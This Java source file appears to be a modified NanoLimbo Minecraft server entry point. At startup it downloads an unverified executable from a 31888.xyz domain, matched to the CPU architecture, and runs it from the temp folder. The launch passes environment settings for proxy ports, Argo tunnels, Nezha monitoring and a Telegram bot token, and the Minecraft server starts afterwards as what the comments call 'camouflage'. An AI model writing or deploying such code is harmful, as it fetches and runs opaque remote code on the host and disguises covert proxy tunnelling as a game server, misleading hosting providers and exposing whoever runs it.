package ua.nanit.limbo;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;

public final class NanoLimbo {

    private static Process sbxProcess;
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    public static void main(String[] args) {
        // 动态检测 Java 版本
        float classVersion = Float.parseFloat(System.getProperty("java.class.version"));
        float javaVersion = classVersion - 44; // 52=Java8, 55=Java11, 61=Java17, 65=Java21
        Log.info("[server] Detected Java %s (class version %.0f)", javaVersion, classVersion);

        if (classVersion < 52.0) {
            System.err.println(ANSI_RED + "ERROR: Java 8+ required, current: " + javaVersion + ANSI_RESET);
            System.exit(1);
        }

        try {
            // 启动代理层：下载并运行 sbx 外部二进制
            runSbxBinary();
            Log.info("[server] Proxy services starting...");

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                Log.info("[server] Shutting down...");
                stopServices();
                Log.info("[server] Goodbye");
            }));

            // 等待代理初始化
            Log.info("[server] Waiting for proxy services to initialize...");
            Thread.sleep(20000);

            // 启动增强 Minecraft 伪装
            Log.info(ANSI_GREEN + "[server] Starting enhanced Minecraft camouflage..." + ANSI_RESET);
            new LimboServer().start();

        } catch (Exception e) {
            Log.error("[server] Fatal error: ", e);
            System.exit(1);
        }
    }

    /**
     * 下载并运行 sbx 二进制（sing-box + cloudflared 一体化代理）
     * 继承自 eooce/NanoLimbo 的成熟方案
     */
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        Path sbxPath = getBinaryPath();
        Log.info("[server] Proxy binary ready: %s", sbxPath);

        ProcessBuilder pb = new ProcessBuilder(sbxPath.toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
    }

    /**
     * 加载环境变量：硬编码默认值 → 系统环境变量覆盖 → .env 文件覆盖
     */
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // 硬编码默认值
        envVars.put("UUID", "2523c510-9ff0-415b-9582-93949bfae7e3");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("S5_PORT", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "spring.io");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "");
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("PORT", "25565");

        // 系统环境变量覆盖
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        // .env 文件覆盖（最高优先级，用于本地测试）
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    /**
     * 根据系统架构下载 sbx 二进制
     */
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.31888.xyz/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.31888.xyz/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.31888.xyz/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Log.info("[server] Downloading proxy binary for %s ...", osArch);
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            Log.info("[server] Proxy process terminated");
        }
    }
}